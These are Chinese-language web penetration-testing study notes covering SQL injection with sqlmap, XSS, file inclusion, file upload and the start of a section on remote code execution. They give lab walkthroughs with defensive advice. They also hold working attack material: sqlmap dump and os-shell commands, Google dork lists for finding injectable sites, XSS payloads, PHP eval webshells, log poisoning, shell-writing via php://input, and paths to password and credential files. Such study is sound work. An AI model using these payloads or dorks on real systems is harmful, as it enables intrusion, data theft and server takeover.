-x：从sitemap.xml站点地图文件中读取目标

-r：读取文本文件

-c：从配置文件sqlmap.conf中读取目标

```

###### 枚举

```shell
-a        # 查询所有

-b        # 查询目标DBMS banner信息

--dbs     # 枚举DBMS所有的数据库

--tables  # 枚举DBMS数据库中所有的表

--columns # 枚举DBMS数据库表中所有的列--字段

--count   # 检索表的条目的数量

-D       # 指定进行枚举的数据库名称

-T       # 指定进行枚举的数据库表名称

-C       # 指定进行枚举的数据库列名称
```

###### 暴力破解

```shell
--common-tables            # 暴力破解表 

--common-colomns           # 暴力破解列
```

###### 注入方式

```sql
--technique=     		#（默认全部使用）

B       				# 基于布尔的盲注

T       				# 基于时间的盲注
	--time-sec         #基于时间注入检测相应的延迟时间（默认为5秒）

E       				# 基于报错的注入

U       				# 基于UNION查询注入

S       				# 基于多语句查询注入
```

###### 访问文件系统

##### 

```sql
--file-read             # 从目标数据库管理文件系统读取文件

--file-write            # 上传文件到目标数据库管理文件系统

--file-dest             # 指定写入文件的绝对路径

--os-cmd=               # 执行操作系统命令

--os-shell              # 交互式的系统shell
```

###### **注入流程**

```sql
#获取旗标信息
sqlmap -u url --banner --batch
#判断有哪些数据库
sqlmap -u url --dbs --batch
#获取表名
sqlmap -u ur1 -D mysql --tables --batch
# 获取字段
sqlmap -u url -D mysql -T user --columns --batch
# 获取字段值
sqlmap -u ur1 -D mysql -T user -C User,password --dump --batch

--technique=TEU
```

###### 常用选项

```shell
--threads n		# 设置注入的线程数（最大为10）
--time-sec s	# 设置盲注sleep（s）
```

以下是搜集的关键词列表，在查找SQL注入时可以在等号后面添加任意数字构造关键词进行搜索。

```
inurl:Offer.php?id=
inurl:Opinions.php?id=
inurl:Page.php?id=
inurl:Pop.php?id=
inurl:Post.php?id=
inurl:Prod info.php?id=
inurl:Product-item.php?id=
inurl:Product.php?id=
inurl:Product ranges view.php?ID=inurl:Productdetail.php?id=
inurl:Productinfo.php?id=
inurl:Produit.php?id=
inurl:Profile view.php?id=
inurl:Publications.php?id=
inurl:Stray-Questions-View.php?num=
inurl:aboutbook.php?id=
inurl:ages.php?id=
inurl:announce.php?id=
inurl:art.php?idm=
inurl:article.php?ID=
inurl:articleshow.asp?articleid=任意数字inurl:artikelinfo.php?id=
inurl:asp
inurl:asp?id=
inurl:avd startphp?avd=inurl:band info.php?id=inurl:buy.php?category=inurl:category.php?id=inurl:channel id=
```

结合谷歌语句搜索，我们换一种方法，可以将通过谷歌搜索到的可能含有SQL注入的URL保存为TXT文件，

![](C:\Users\16159\AppData\Roaming\Typora\typora-user-images\image-20230902153313366.png)

然后使用SQLmap进行批量检测，命令如下：

   sqlmap.py -m c:/1.txt --batch

### 1.10  UA注入

burpsuite抓取网站

将抓取到的内容放到txt里，在user-agent行末加个星号*，再放到kali的/root目录下

sqlmap -r bp.txt --batch --level 5 --risk 3 --threads 10 --time-sec=2 --dbs





### 1.11防御

1-对用户输入的内容进行**转义** (PHP中addslashes()、mysgl_real_escape()函数)

2-限制关键字的输入 (PHP中preg replace()函数正则替换关键字) ，限制输入的**长度**

3-使用SOL语句**预处理**，对SOL语句首先进行预编译，然后进行参数绑定，最后传入参数

4-部署防护墙和软硬WAF

**预编译**

简介

SQL注入是因为解释器将传入的数据当成命令执行而导致的，预编译是用于解决这个问题的一种方法。和普通的执行流程不同，预编译将一次查询通过两次交互完成，第一次交互发送查询语句的模板，由后端的SQL引擎进行解析为AST或Opcode，第二次交互发送数据，代入AST或Opcode中执行。因为此时语法解析已经完成，所以不会再出现混淆数据和代码的过程。

 **模拟预编译**

为了防止低版本数据库不支持预编译的情况，模拟预编译会在客户端内部模拟参数绑定的过程，进行自定义的转义。

绕过

 **预编译使用错误**

预编译只是使用占位符替代的字段值的部分，如果第一次交互传入的命令使用了字符串拼接，使得命令是攻击者可控的，那么预编译不会生效。

 **部分参数不可预编译**

在有的情况下，数据库处理引擎会检查数据表和数据列是否存在，因此数据表名和列名不能被占位符所替代。这种情况下如果表名和列名可控，则可能引入漏洞。

**预编译实现错误**

部分语言引擎在实现上存在一定问题，可能会存在绕过漏洞。



## 2、XSS漏洞

XSS(Cross-Site-Script)，跨站脚本，即在框内插入恶意脚本盗取用户cookie等信息。在线靶场:https://xssag:com/yx/index.php
XSS平台
https://xss.pt
https://xsshs.cn

### XSS分类

| 反射型 | 经过后端，不经过数据库                                       |
| ------ | ------------------------------------------------------------ |
| 存储型 | 经过后端，经过数据库                                         |
| DOM    | 不经过后端,DOM—based XSS漏洞是基于文档对象模型Document Objeet Model,DOM)的一种漏洞,dom - xss是通过url传入参数去控制触发的。 |

### 危害

存在XSS漏洞时，可能会导致以下几种情况：

1. 用户的Cookie被获取，其中可能存在Session ID等敏感信息。若服务器端没有做相应防护，攻击者可用对应Cookie登陆服务器。
2. 攻击者能够在一定限度内记录用户的键盘输入。
3. 攻击者通过CSRF等方式以用户身份执行危险操作。
4. XSS蠕虫。
5. 获取用户浏览器信息。
6. 利用XSS漏洞扫描用户内网。



### XSS的利用:

窃取Cookie:
当你浏览某网站时，由Web服务器置于你硬盘上的一个非常小的文本文件，它可以记录你的用户ID、密码、浏览过的网页、停留的时间等信息。当你再次来到该网站时，网站通过读取Cookie，得知你的相关信息，就可以做出相应的动作，如在页面显示欢迎你的标语，或者让你不用输入ID、密码就直接登录等等。如果你清理了Cookie，那么你曾登录过的网站就没有你的修改过的相关信息。

Cookie是非常常见的，基本上你的浏览器中都会存储了成百上千条Cookie信息。

记录键盘：

网页被植入xss脚本，普通用户访问此网页时，该用户在当前页面上所有的键盘按键都会被记录下来，并且发送到远端服务器。

方法实现：

```html
<!-- 弹框函数 -->
<script>alert(1)</script>
onclick=alert(1)
onmouseover=alert(1)
onfocus=javascript:alert()
<iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydCgpPC9zY3JpcHQ+">
#看看data的，这里利用iframe标签，插入一个标签data:text/html;base64, 将后面的内容进行base64解码，PHNjcmlwdD5hbGVydCgpPC9zY3JpcHQ+进行base64解码后是<script>alert()</script>

<!-- 引用外部文件 -->
<script src='http://127.0.0.1/test.js'></script>
<a href="javascript:alert(1)">123</a>

<!-- 图片类 -->
<img src="x” onerror=alert(1)>
#onerror属性是指当图片加载不出来的时候触发js函数，以上面的代码为例，这里因为src指向的是值666，而不是图片的地址和base64编码啥的，就会导致触发alert函数

<!-- DOM -->
document.getElementById("footer").innerHTML = "<script>alert('XSS Attack!')"</script>";
document.write("<script>alert('XSS Attack!')</script>");
document.write("<input");****
    

```



结合存储型XSS进行：

我们也可以结合存储型XSS漏洞进行攻击，将CSRF代码写入XSS注入点中，如下：
![在这里插入图片描述](https://img-blog.csdnimg.cn/20201029152950417.png#pic_center)

![在这里插入图片描述](https://img-blog.csdnimg.cn/20201029152950417.png#pic_center)

### 绕过

* 大小写绕过
* 双写绕过
* 编码绕过(HTML实体编码，16进制，10进制)

**xss过关总结：**

14、17关有问题

15关没过

xss通关教程：https://blog.csdn.net/l2872253606/article/details/125638898

```html
关键字尝试： " ' sRc DaTa OnFocus OnmOuseOver OnMouseDoWn P <sCriPt> <a hReF=javascript:alert()> &#106; 
```

JS弹窗函数alert()

闭合绕过

onmouseover事件可以绕过html实体化（即<>号的过滤）

可以插入标签（如<a>标签的href属性）达到js执行的效果，前提是闭合号<"">没失效

大小写法绕过str_replace()函数

双拼写绕过删除函数

 href属性自动解析Unicode编码（level8、9）

level9需要向传入的值里面添加http://并用注释符/**/注释掉否则会执行不了无法弹窗

根据源码猜解传参的参数名，隐藏的input标签可以插入type="text"显示 （level10）

考虑一下http头传值(用BP抓包并添加referer、UA、cookie等)，本关是referer，但接下来也有可能是其他头，如Cookie等（11、12、13关）

第15关

![image-20230731200851876](C:\Users\16159\AppData\Roaming\Typora\typora-user-images\image-20230731200851876.png)

可以看到这儿有个陌生的东西ng-include

> ng-include指令就是文件包涵的意思，用来包涵外部的html文件，如果包涵的内容是地址，需要加引号

我们先试试看包涵第一关，构建payload

```ruby
?src='/level1.php'
```

![image-20230731200952257](C:\Users\16159\AppData\Roaming\Typora\typora-user-images\image-20230731200952257.png)

所以可以随便包涵之前的一关并对其传参，以达到弹窗的效果，先测试一下过滤了啥，构造payload

```xml
?src=" ' sRc DaTa OnFocus <sCriPt> <a hReF=javascript:alert()> &#106;
```

 对比发现，这里有个html实体化函数在，没有删掉东西，所以不影响我们接下来的操作，我们可以包涵第一关并让第一关弹窗（注意，这里不能包涵那些直接弹窗的东西如<script>，但是可以包涵那些标签的东西比如<a>、<input>、<img>、<p>标签等等，这些标签是能需要我们手动点击弹窗的），这里我们使用img标签，可参考XSS常见的触发标签，构造payload

``http://localhost/xss/level15.php?src='level1.php?name=<img src=1 onmouseover=alert(1)>';``
当鼠标移动到图片的时候就触发了弹窗



16关过滤空格、/、script，所以用回车的url编码%0d代替空格`?keyword=<a%0Donclick='alert(1)'>`

### XSS的防御策略：

------

**只要有输入数据的地方，就可能存在 XSS 危险。永远不相信用户的输入。需要对用户的输入进行处理，只允许输入合法的值，其它值一概过滤掉。**

**XSS防御的总体思路是：** 对输入进行过滤，对输出进行编码

1. httpOnly：在 cookie 中设置 HttpOnly 属性后，js脚本将无法读取到 cookie 信息。

2. 输入过滤：一般是用于对于输入格式的检查，例如：邮箱，电话号码，用户名，密码……等，按照规定的格式输入。
   不仅仅是前端负责，后端也要做相同的过滤检查。因为攻击者完全可以绕过正常的输入流程，直接利用相关接口向服务器发送设置。

3. 转义 HTML：如果拼接 HTML 是必要的，就需要对于url中的引号，尖括号，斜杠进行转义,但这还不是很完善.想对 HTML 模板各处插入点进行充分的转义,就需要采用合适的转义库。
   例如：·htmlspecialchars()·函数把一些预定义的字符转换为 HTML 实体

   ```
   #预定义的字符是：      
   & (和号)   成为 &amp         
   " (双引号) 成为 &quot           
   ’ (单引号) 成为 &#039                     
   < (小于)   成为 &lt                    
   > (大于)   成为 &gt
   ```

4. 白名单：对于显示富文本来说，不能通过上面的办法来转义所有字符，因为这样会把需要的格式也过滤掉。
   这种情况通常采用白名单过滤的办法，当然也可以通过黑名单过滤，但是考虑到需要过滤的标签和标签属性实在太多，更加推荐使用白名单的方式。

## 3. 文件包含漏洞

简单一句话，为了更好地使用代码的重用性，引入了文件包含函数，可以通过文件包含函数将文件包含进来，直接使用包含文件的代码。
在大多数Web语言中都会提供的功能，但PHP对于包含文件所提供的功能太强大，所以包含漏洞经常出现在PHP语言中，但其他语言中可能出现包含漏洞。

功能：实现代码复用

#### 文件包含漏洞的原理：

大多数情况下，文件包含函数中包含的代码文件是固定的，因此也不会出现安全问题。
但有些时候，文件包含的代码文件被写成了一个变量，且这个变量可以由前端用户传进来，这种情况下，如果没有做足够的安全考虑，则可能会引发文件包含漏洞。
攻击着会指定一个“意想不到”的文件让包含函数去执行，从而造成恶意操作。

**示例代码：**

```
?page=a.php
?home=b.html
?file=content..
```

#### 危险函数

```
include        #执行到include时才包含文件，找不到被包含文件时只会产生警告，脚本将继续执行
include_once   #同上，区别是如果该文件中已经被包含过，则不会再次包含。
require        #程序一运行就包含文件，找不到被包含的文件时会产生致命错误，并停止脚本
require_once   #同上，区别是 PHP会检查该文件是否已经被包含过，如果是则不会再次包含。
```

#### 文件包含漏洞的分类：

1. 本地文件包含漏洞：
   仅能够对服务器本地的文件进行包含，由于服务器上的文件并不是攻击者所能够控制的，因此该情况下，攻击着更多的会包含一些 固定的系统配置文件，从而读取系统敏感信息。
   很多时候本地文件包含漏洞会结合一些特殊的文件上传漏洞，从而形成更大的威力(例如上传webshell后用包含方式调用)。

2. 远程文件包含漏洞：

   能够通过url地址对远程的文件进行包含，这意味着攻击者可以传入任意的代码，这种情况没啥好说的，准备挂远程码

   ﻿php远程包含漏洞必要参数

   ```
   allow_url_include=on
   magic_quotes_gpc=off
   ```

#### **利用思路**

* 获取敏感信息
* 配合文件上传getshell

* 单独使用getshell（日志文件报错记录方法）

#### **前提条件**

php.ini文件打开下面两个选项。

```ini
allow_url_fopen = On
allow_url_include = On
```

#### **敏感文件**

**linux**
/etc/passwd																				//保存了系统中所有的用户信息

/etc/shadow																				//用户的密码信息

/root/.ssh/authorized_keys														//公钥文件

/root/.bash_history																	//用户终端操作历史记录

/usr/local/app/apache2/conf/httpd.conf								//apache2默认配置文件

/usr/local/app/apache2/conf/extra/httpd-vhosts.conf		//虚拟网站设置

/usr/local/app/php5/lib/php.ini												//php相关设置

/etc/httpd/conf/httpd.conf														//apache

/etc/php5/apache2/php.ini														//ubuntu系统的默认路径



**Windows**

C:\boot.ini																						//查看系统版本

C: windows \system32\ inetsrv\MetaBase.xml						//查看IIS虚拟主机配置文件

C:\windows repair sam																//存储Windows系统初次安装的密码

C:\ Program Files\mysql\my.ini										//mvsql配置，记录管理员登陆过的MYSOL用户名和密码

C: Program Files\mysql\data\mysql\user.MYD					//mvsql.user表中的数据库连接密码

C: windows\php.ini php.ini													//php配置文件

C: Windows\ system.in															//winnt的php配置信息

##### **Session文件常见路径**

> /var/lib/php/sess_PHPSESSID
> /var/lib/php/sess_PHPSESSID
> /tmp/sess_PHPSESSID
> /tmp/sessions/sess_PHPSESSID

##### **日志文件**

常见日志文件名字为access_log，access.log，error.log，Logfiles等。

#### **php伪协议**

file://——访问本地文件系统

http://——访问HTTP(s)网址

ftp://——访问FTP(S) URLs

php://一访问各个输入/输出流(I/O streams)zlib://压缩流

data://-数据(RFC2397)

glob://一 查找匹配的文件路径模式

phar://-PHP 归档

ssh2://  Secure Shell 2

rar://- RAR

ogg://一音频流

expect://-处理交互式的流

php 伪协议（php wrapper），也就是php支持的协议和封装协议。php内置了很多URL风格的封装协议，也可以通过stream_wrapper_register()来注册自定义的协议。

php手册：https://www.php.net/manual/en/wrappers.php.php

##### 1. php://filter	

作用：是一种元封装器， 设计用于数据流打开时的筛选过滤应用，支持多种==过滤器==

1. 输入过滤（读取数据）：

   `read=[filter_name]/resource`：对读取的数据应用指定的过滤器。

2. 输出过滤（写入数据）：

   `write=[filter_name]/resource`：对写入的数据应用指定的过滤器。

常用过滤器

1. 字符串过滤器（string）

   * string.rot13

     一种字符处理方式，字符右移十三位。

   * string.toupper

     将所有字符转换为大写。

   * string.tolower

     将所有字符转换为小写。

   * string.strip_tags
     处理掉读入的所有标签，如XML。用于绕过死亡exit

2. 转换过滤器（convert）

   * base64	`php://filter/read=convert.base64-encode/resource=路径`

##### 2. php://input   

​	返回HTTP-headers之后的原始数据

**例子：**

###### 实验目的

通过本实验，通过文件包含漏洞，利用PHP封装伪协议，发送POST数据进行命令执行。

###### 实验环境

- 操作机：Win10
  用户名：Administrator
  密码：Sangfor!7890
- 靶机：Apache + PHP
- 实验地址：http://ip/include/include.php

###### 实验原理

PHP有很多内置URL风格的封装协议,这类协议与fopen()，copy()，file_exists()，filesize()等文件系统函数所提供的功能类似。
这类协议有：
![image.png](https://oss.edu.sangfor.com.cn/file/20210602/image210602202143233yv6m4.png)
利用php流input中流的概念，将原来的文件流重定向到了用户可控的输入流中执行命令。

###### 实验步骤

1、登录操作机，打开浏览器，在浏览器中访问http://ip/include/include.php
![image.png](https://oss.edu.sangfor.com.cn/file/20210602/image210602172648398jklgo.png)

2、访问http://ip/include/include.php?page=php://input
![image.png](https://oss.edu.sangfor.com.cn/file/20210602/image210602202556714wk9kt.png)

3、勾选"Post data"，在提交post数据的位置输入"<?php phpinfo();?>"，并发送数据执行
![image.png](https://oss.edu.sangfor.com.cn/file/20210602/image210602202911655cx4ti.png)

4、发送"<?php system(‘dir’);?>"数据执行系统命令
![image.png](https://oss.edu.sangfor.com.cn/file/20210602/image210602203141173z1llf.png)

5、发送"<?php system(‘whoami’);?>"数据执行系统命令
![image.png](https://oss.edu.sangfor.com.cn/file/20210602/image210602203233890o683b.png)

6、发送"<?php fputs(fopen(‘shell.php’,‘w’),’<?php phpinfo();?>’);?>"数据执行，生成shell脚本文件
![image.png](https://oss.edu.sangfor.com.cn/file/20210602/image2106022042211640vrea.png)

7、访问http://ip/include/include.php?page=shell.php
![image.png](https://oss.edu.sangfor.com.cn/file/20210602/image2106022055461581eiqe.png)

###### 实验总结

通过本实验，利用PHP封装伪协议中的php流input，发送**POST**数据（可利用火狐的插件，也可以利用Burp Suite抓包修改数据包）进行命令执行，可以执行操作系统命令，也可以在服务器端生成木马文件，用Webshell管理工具连接木马文件。
对伪协议的用法总结如下：
![image.png](https://oss.edu.sangfor.com.cn/file/20210602/image210602211152030fivoi.png)

##### 3. data:

​	允许将数据直接嵌入到URL中,用于在浏览器中内联嵌入小型数据，如图像、CSS样式、HTML代码片段或其他文本或二进制数据。这样可以避免发送额外的HTTP请求，从而提高页面加载性能，特别适用于小型资源。

格式：`data:[<媒体类型>][;base64],<数据>`

<媒体类型>：表示嵌入数据的媒体类型，如 `text/plain`、`image/jpeg`、`application/pdf` 等。如果省略此部分，浏览器将尝试从上下文或内容中推断媒体类型。

text/plain，纯文本类型

使用：

`data://text/plain,<?php phpinfo();?>`
`data:text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=`

##### 4. file://

​	用于访问本地文件系统中的文件。它允许通过 URI 来直接访问计算机上的文件，而无需通过 HTTP 或其他网络协议。通常用于访问本地文件，而不是通过网络获取资源。

格式：`file://<path_to_file>`

##### 5. zip://

压缩文件

格式：`zip:// [压缩文件绝对路径]#[压缩文件内的子文件名]`		不行就将#改为%23

类似协议：

compress.bzip2://

compress.zlib://

**例子：**

###### 实验目的

通过本实验，借助文件包含漏洞，利用PHP封装伪协议的zip流将脚本文件zip压缩，用来绕过文件上传的检测，再进行包含解析。

###### 实验环境

- 操作机：Win10
  用户名：Administrator
  密码：Sangfor!7890
- 靶机：Apache + PHP
- 实验地址：http://ip/include/include.php

###### 实验原理

PHP有很多内置URL风格的封装协议,这类协议与fopen()，copy()，file_exists()，filesize()等文件系统函数所提供的功能类似。
这类协议有：
![image.png](https://oss.edu.sangfor.com.cn/file/20210602/image210602202143233yv6m4.png)
利用zip流，先将将要执行的PHP代码写好文件名为test.txt，将test.txt进行zip压缩,压缩文件名为test.zip，上传文件绕过上传检测，再进行包含解析。

###### 实验步骤

1、新建info.txt文件
![image.png](https://oss.edu.sangfor.com.cn/file/20210602/image2106022140058556ribi.png)

2、对info.txt文件进行zip压缩
![image.png](https://oss.edu.sangfor.com.cn/file/20210602/image210602214207996d27jl.png)
![image.png](https://oss.edu.sangfor.com.cn/file/20210602/image210602214218753el0c8.png)

3、登录操作机，打开浏览器，在浏览器中访问http://ip/up/up.html
![image.png](https://oss.edu.sangfor.com.cn/file/20210602/image2106022144110588uugz.png)

4、点击“选择文件”按钮，选中要上传的文件
![image.png](https://oss.edu.sangfor.com.cn/file/20210602/image210602214620757isyhj.png)

5、点击“submit”按钮，上传info.zip文件
![image.png](https://oss.edu.sangfor.com.cn/file/20210602/image210602214743051h6qzn.png)

6、访问http://ip/include/include.php
![image.png](https://oss.edu.sangfor.com.cn/file/20210602/image210602172648398jklgo.png)

7、访问http://ip/include/include.php?page=xxx.php，包含不存在的文件，使其报错，获取服务器的Web根目录、当前网页的路径、Web服务器等信息，从而得到上传脚本的绝对路径
![image.png](https://oss.edu.sangfor.com.cn/file/20210602/image210602172722546v4iug.png)

8、访问http://ip/include/include.php?page=zip://C:/server/apache22/htdocs/up/upload/info.zip%23info.txt
![image.png](https://oss.edu.sangfor.com.cn/file/20210602/image210602215603544jidy0.png)

###### 实验总结

通过本实验，利用PHP封装伪协议中的zip流，先将要执行的PHP代码写好文件名为test.txt，将test.txt进行zip压缩,压缩文件名为test.zip，绕过文件上传的限制，如果可以上传zip文件便直接上传，若不能便将test.zip重命名为test.jpg后再上传。使用zip协议需要指定**绝对路径**，使用相对路径会包含失败；同时将#编码为%23。
对伪协议的用法总结如下：
![image.png](https://oss.edu.sangfor.com.cn/file/20210602/image210602211152030fivoi.png)

#### 文件包含漏洞的上传技巧

##### 1、小马+图片：

\* 方法一：直接伪造头部GIF89A

- 方法二：CMD方法，copy /b test.png+1.php muma.png
  ﻿* 方法三：直接使用工具往图片中写入一句话木马。

##### 2、小马+日志：

当某个PHP文件存在本地包含漏洞，而却无法上传正常文件，这就意味这有包含漏洞却不能拿来利用，这时攻击者就有可能会利用apache日志文件来入侵。

> Apache服务器运行后会生成两个日志文件，access.log(访问日志)和error.log(错误日志)，apache的日志文件记录下我们的操作，并且写到访问日志文件access.log之中

1、打开配置文件`httpd.conf”第299行
删除井号以取消注释

```
##CustomLog "logs/access.log" common
```

2、将一句话木马写到 url中的fiename 里
虽然会提示失败，但是会记录到日志文件中。**

```
#URL地址
http://xx.com/xx.php?filename=<?php @eval($_POST['123']);?>
#access_log中会有如下内容
..... GET /xx.php?filename=%3C?PHP%20@eval($_POST[%27123%27]);?%3E ......
```

3、然后用包含漏洞包含日志文件
小马就被运行了，但是由于编码的缘故有可能并不生效。用菜刀等工具连接试试

```
#URL
http://xx.com/xx.php?filename=../Apache/logs/access.log
```

##### 3、利用php包含来读文件：

```
# 1 构造URL:x.php是实现传到服务器的一句话木马
http://192.168.1.55:8080/dvwa/vulnerabilities/fi/?page=php://filter/read=convert.base64-encode/resource=x.php
# 2 通过bp抓包可以发现，返回的包里面有一串base64的加密字符串

# 3 将加密字符串解密，可得一句话木马
<?php eval($_POST['cmd']);>
```

##### 4、php包含写文件：

注意:只有在`allow_url_include`为on的时候才可以使用，如果想查看回显结果那还要这样

1. 在C:\php\php-5.2.14-Win32下找到php-apache2handler.ini
2. 打开，查找`display_funtions=proc-open,oppen,exec,system……`
3. 删掉system,然后重启apache。

> 意思就是排除system命令

```
#构造URL:
http://192.168.1.55:8080/dvwa/vulnerabilities/fi/?page=php://input
#抓包，修改提交的post数据为
<?php system('net user');?>
﻿#在返回包中，应该能看到net user命令的执行结果
```



##### 5、`str_replace`函数绕过：（中）

使用`str_replace`函数替换指定的字符串是极其不安全的，因为可以使用很多方法绕过。

又假设设置的过滤`../、..\、http://`等，以防止目录穿越和远程文件

```
#1、可以路径嵌套
http://192.168.0.103/dvwa/vulnerabilities/fi/page=..././..././..././..././..././xampp/htdocs/dvwa/php.ini
#2、绝对路径不受任何影响
﻿http://192.168.0.103/dvwa/vulnerabilities/fi/page=C:/xampp/htdocs/dvwa/php.ini
#3、双写http头使用远程文件
﻿http://192.168.0.103/dvwa/vulnerabilities/fi/page=htthttp://p://192.168.5.12/phpinfo.txt
```

##### 6、fnmatch函数绕过：（高）

经常会有开发，用fnmatch函数，用于指定只能用特定的文件名开头的文件

```
if(!fnmatch("file*",$file)&&$file!="include.php")
#本意是当include.php，又不是file开头的文件名时，就不能调用
#但殊不知有file://协议，也是可以读取文件的
http://192.168.0.103/dvwa/vulnerabilities/fi/page=file:///C:/xampp/htdocs/dvwa/php.ini
```

PHP带有很多内置URL风格的封装协议，可用于类似fopen()、copy()、file_exists()和filesize()的文件系统函数。

```
File:// 访问本地文件系统
htt[p:// 访问HTTP(s)网址
ftp:// 访问FTP(s)URLS
php:// 访问各个输入/输出流(I/o streams)
zlib:// 压缩流
data:// 数据(RFC2397)
ssh2:// Secure Shell 2
expect:// 处理交互式的流
glob:// 查找匹配的文件路径模式
#有时候对方程序员对协议进行限制我们可以多尝试尝另外的
```

#### 漏洞防范

防护解析
1.严格判断包含中的参数是否外部可控

2.路径限制:限制被包含的文件只能是某一个文件夹内，一定要禁止目录跳转字符，如:”../"

3.包含文件验证: 验证被包含的文件是否是白名单中的一员

4.尽量不要使用动态包含，可以在需要包含的页面固定写好

5.将需要包含的文件用白名单方式写死

## 4. 文件上传漏洞

![mind-map](C:\Users\16159\AppData\Roaming\Typora\typora-user-images\mind-map-1696215553715-1.png)

#### 1. 漏洞概述

##### 1.1 什么是文件上传漏洞

​	文件上传漏洞是指用户上传了一个可执行的脚本文件，并通过此脚本文件获得了执行服务器端命令的能力。

​	这种攻击方式是最为直接和有效的，“文件上传” 本身没有问题，有问题的是文件上传后，服务器怎么处理、解释文件。如果服务器的处理逻辑做的不够安全，则会导致严重的后果。



##### 1.2 文件上传漏洞危害

- 上传文件是web脚本语言，服务器的web容器解释并执行了用户上传的脚本，导致代码执行
- 上传文件是病毒或者木马时，主要用于诱骗用户或者管理员下载执行或者直接自动运行
- 上传文件是Flash的策略文件 crossdomain.xml，黑客用以控制Flash在该域下的行为
- 上传文件是病毒、木马文件，黑客用以诱骗用户或者管理员下载执行；
- 上传文件是钓鱼图片或为包含了脚本的图片，在某些版本的浏览器中会被作为脚本执行，被用于钓鱼和欺诈。 

​	除此之外，还有一些不常见的利用方法，比如将上传文件作为一个入口，溢出服务器的后台处理程序，如图片解析模块;或者上传一个合法的文本文件，其内容包含了PHP脚本，再通过"本地文件包含漏洞(Local File Include)"执行此脚本。

##### 1.3 php的版本差异

​	在 PHP 中，NTS (Non-Thread-Safe) 版本和 TS (Thread-Safe) 版本是两种不同的构建版本，针对不同的运行环境和需求而设计。它们的主要区别在于线程安全性和并发处理能力。

1. NTS (Non-Thread-Safe) 

   ​	NTS 版本是非线程安全的构建版本。这意味着在 NTS PHP 中，不同线程不能同时共享同一个 PHP 进程的资源，因此它**不适用于在多线程环境下运行**，比如 Apache 的模块或多线程的服务器。NTS 版本的 PHP 在运行时使用的是进程模型，每个请求都在独立的进程中执行，避免了线程间的竞争和冲突。如果你使用的是 Apache 的 `mod_php` 模式或 FastCGI 模式，使用 NTS 版本的 PHP会更好。

2. TS (Thread-Safe) 

   ​	TS 版本是线程安全的构建版本。在 TS PHP 中，多个线程可以共享同一个 PHP 进程的资源，并能够同时执行。这使得 TS 版本的 PHP 适用于多线程的服务器环境，比如使用 PHP 作为 Apache 的 `worker` 或 `event` MPM，或者在 PHP-FPM 中运行多个 PHP 子进程。TS 版本的 PHP 通过使用线程同步技术来确保多线程访问共享资源的安全性。

​	在 Windows 上，由于 Apache 在多线程模式下运行，通常需要使用 TS 版本的 PHP。而在 Linux/Unix 上，可以根据具体的运行环境和需求选择合适的 NTS 或 TS 版本。

##### 1.4 CGI与FastCGI

**CGI（Common Gateway Interface）**

​	CGI 是 Web 服务器与脚本解释器之间的标准接口，用于处理客户端（浏览器）发送的动态内容请求。当用户请求访问一个使用 CGI 的脚本时，Web 服务器会启动一个单独的进程来运行该脚本，并将用户的请求信息传递给脚本解释器。脚本解释器处理脚本，并将结果返回给 Web 服务器，然后 Web 服务器将结果发送给客户端。

尽管 CGI 标准且可移植，但在性能方面存在一些问题。每次请求都需要启动一个新的进程来运行脚本，其占用了较高的资源且响应时间较慢。

**FastCGI**

​	FastCGI 是 CGI 的扩展和改进，旨在提高性能和效率。FastCGI 允许脚本解释器保持在内存中，重复使用，使Web 服务器可以与一个或多个脚本解释器保持长时间连接，脚本解释器会一直保持运行状态，处理多个请求。而不是像 CGI 那样每次请求都启动一个新的进程，以减少开销，提高处理能力。

#### 2.绕过方式

[文件上传利用绕过方式总结]()

[靶场、绕过方法、原理、实战----文件上传.md](C:\Users\16159\Desktop\网安\渗透\文件上传\文件上传.md)

![img](https://oss-emcsprod-public.modb.pro/wechatSpider/modb_20210628_3d64c39c-d7de-11eb-8d0e-00163e068ecd.png)

```shell
http://dvwa/vulnerabilities/fi/?page=../../hackable/uploads/eval.php&cmd=fwrite(fopen('111.php','w'),'123456');

fopen(‘文件名’，‘权限’)

权限：w：创建文件

r：读取文件

fwrite(fopen(‘文件名’，‘权限’),’想输入的内容’)

trim:删除空格

deldot:删除文件名末端的点

strrchr：找最后字符出现的位置

strtolower:

后缀名出现::$DATA不会查询后缀名
```

如果有文件包含漏洞，直接上传图片马、二次渲染 

如果没有，就白名单，黑名单，条件竞争



白名单绕过方法：

00截断、条件竞争、

**隐藏文本：**

```shell
# 隐藏文本内容

"Z3MlVXmtnQG0xBc3t=hZ1JFZFNlW" | ac D:\26216\OneDrive\Documents\课件\渗透测试\7.文件上传\source\sample.txt:secret.txt

# 向文件的隐藏文件中写入隐藏文本

echo string > sample.txt:secret.txt

# 查看隐藏内容

notepad sample.txt:secret.txt

#用url访问
http://localhost/upload-labs-master/include.php?file=upload/sample.txt:secret.txt&cmd=phpinfo();
#注意用到文件包含  注意后面加的是&cmd=
```

#### **3. 文件上传漏洞防御**

1. **文件类型验证**：不仅要检查文件的扩展名，还要检查文件的 MIME 类型和文件的内容。
2. **限制上传文件的大小**：通过限制上传文件的大小，可以防止攻击者上传大文件来消耗服务器的资源。
3. **设置文件权限**：上传的文件不应该有执行权限，也不应该被放在可执行文件的目录下。
4. **使用随机文件名**：不要使用用户提供的文件名，应该生成一个随机的文件名。
5. **使用安全的文件上传库**：许多现代的 Web 开发框架提供了安全的文件上传库，应该尽量使用这些库，避免自己实现文件上传功能。
6. **安全配置服务器**：应确保服务器的配置是安全的，例如禁止解析不应该被解析的文件类型，禁止执行不应该被执行的目录等。





## 5. RCE(远程代码执行漏洞)

csdn教程https://blog.csdn.net/weixin_44268918/article/details/128386149

#### 漏洞介绍

​	RCE（Remote Command/Code Execution）分为远程命令和代码执行，其产生原理也基本相同，RCE漏洞将允许恶意行为人通过LAN、WAN或Internet在远程计算机上执行自己选择的任何代码，属于更广泛的任意代码执行(ACE)漏洞类别。不仅可以获取目标系统的访问权限，还可以完全控制目标系统。

​	**远程命令执行**

​		执行**系统**命令，漏洞的实现与操作系统有关

​	**远程代码执行**

​		执行后端代码，漏洞的实现与网站使用的后端语言有关



#### 常见函数

##### PHP命令执行

允许PHP命令执行的函数

[远程命令执行](https://www.ngui.cc/article/show-519518.html?action=onClick)

###### 1.system

​	可以执行系统命令并将其输出

system ( string $command [ int &$return_var ])
函数执行 command 参数所指定的命令·并且输出执行结果。system和exec的区别在于·system在执行系统外部命令时·直接将结果输出到浏览器·如果执行命令成功则返回true·否则返回false。

```php
<?php
	highlight_file(__FILE__);
	system('pwd');
	system('whoami');
?>
```

###### 2.exec

